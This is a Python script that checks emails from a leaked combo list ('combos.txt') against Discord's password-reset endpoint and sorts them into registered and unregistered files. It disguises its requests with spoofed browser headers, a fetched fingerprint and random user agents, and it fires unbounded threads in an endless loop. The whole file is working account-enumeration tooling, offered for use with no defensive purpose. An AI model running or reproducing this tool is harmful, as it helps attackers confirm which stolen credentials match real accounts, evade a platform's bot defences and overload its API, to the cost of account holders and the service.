import requests, threading, random, user_agent
from colorama import Fore

base_email = open("combos.txt", "r").read().splitlines()

def __get__fingerprint():
  headers = {
    "Host"                  : "discord.com",
    "Connection"            : "keep-alive",
    "sec-ch-ua"             : '"Chromium";v="92", " Not A;Brand";v="99", "Microsoft Edge";v="92"',
    "X-Super-Properties"    : "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Mi4wLjQ1MTUuMTMxIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiI5Mi4wLjQ1MTUuMTMxIiwib3NfdmVyc2lvbiI6IjEwLjE1LjciLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTI3OTIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9",
    "X-Context-Properties"  : "eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0=",
    "Accept-Language"       : "en-US",
    "sec-ch-ua-mobile"      : "?0",
    "User-Agent"            : user_agent.generate_user_agent(),
    "Authorization"         : "undefined",
    "Accept"                : "*/*",
    "Sec-Fetch-Site"        : "same-origin",
    "Sec-Fetch-Mode"        : "cors",
    "Sec-Fetch-Dest"        : "empty",
    "Referer"               : "https://discord.com/register",
    "Accept-Encoding"       : "gzip, deflate, br"
  }

  finger_res = requests.get("https://discord.com/api/v9/experiments", headers=headers)
  return finger_res.json()['fingerprint']



def __base__headers():
 return {
    'authority'            : 'discord.com',
    'accept'               : '*/*',
    'accept-language'      : 'en-US,en;q=0.9',
    'cache-control'        : 'no-cache',
    'origin'               : 'https://discord.com',
    'pragma'               : 'no-cache',
    'referer'              : 'https://discord.com/login',
    'sec-ch-ua'            : '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile'     : '?0',
    'sec-ch-ua-platform'   : '"Windows"',
    'sec-fetch-dest'       : 'empty',
    'sec-fetch-mode'       : 'cors',
    'sec-fetch-site'       : 'same-origin',
    'user-agent'           :  user_agent.generate_user_agent(),
    'x-debug-options'      : 'bugReporterEnabled',
    'x-discord-locale'     : 'en-US',
    'x-fingerprint'        : __get__fingerprint(),
    'x-super-properties'   : 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMDYuMC4xMzcwLjQ3IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE1MjcyNywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
  }



def __check__email():
 try:
  with requests.Session() as session:
   base_email2  = random.choice(base_email)
   email        = base_email2.split(':')[0]
 
   payload      = {
        'login': email,
        'captcha_key': None,
   }
 
   res          = session.post(
        'https://discord.com/api/v9/auth/forgot', 
        headers = __base__headers(),
        json    = payload
   )
   if 'captcha-required' in res.text:
     print('{}>> {} :: Unregistered :: Discord Email Checker'.format(Fore.RED, email)); open('discord_unreg.txt', 'a').write(f'{email}\n')
   if res.status_code == 204:
     print('{}>> {} :: Registered :: Discord Email Checker'.format(Fore.GREEN, email)); open('discord_reg.txt', 'a').write(f'{email}\n')

 except Exception:
  pass


while True:
  threading.Thread(target=__check__email).start()
  
